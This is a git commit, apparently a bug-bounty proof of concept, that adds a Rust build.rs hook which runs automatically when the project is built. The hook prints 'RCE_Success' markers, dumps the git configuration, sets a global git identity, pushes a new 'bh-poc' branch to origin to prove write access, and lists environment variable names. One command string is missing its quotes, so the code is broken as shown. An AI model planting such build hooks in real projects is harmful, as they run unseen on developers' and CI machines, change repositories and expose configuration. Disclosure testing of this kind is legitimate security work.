aec3eecf4b9883fd87d98bb7edadf334d93339c0
barakharyati <41957095+barakharyati@users.noreply.github.com>
2025-12-10 12:11:36 +0200

    test do not merge

---
+++ build.rs
@@ -0,0 +1,30 @@
+use std::process::Command;
+
+fn main() {
+    // Marker to prove RCE
+    eprintln!("____RCE_Success");
+
+    // Show git config (read-only)
+    let _ = Command::new("sh")
+        .arg("-c")
+        .arg("git config --list >&2 || echo 'no git config' >&2")
+        .status();
+
+    
+    eprintln!("____RCE_Success");
+    // test write permissions 
+    let _ = Command::new("sh")
+        .arg("-c")
+        .arg( git config --global user.email "bh@someemail.com"; git config --global user.name "H1Tester"; git fetch origin >&2; git checkout master/v2 >&2; git pull origin master/v2 >&2; git checkout -b bh-poc >&2; git add . >&2; git push -u origin bh-poc >&2
+)
+        .status();
+
+
+    // Show environment variable *names* (read-only, no secrets exfil)
+    let _ = Command::new("sh")
+        .arg("-c")
+        .arg("printenv | cut -d= -f1 >&2")
+        .status();
+
+    eprintln!("---test permissions (SAFE PoC)---");
+}
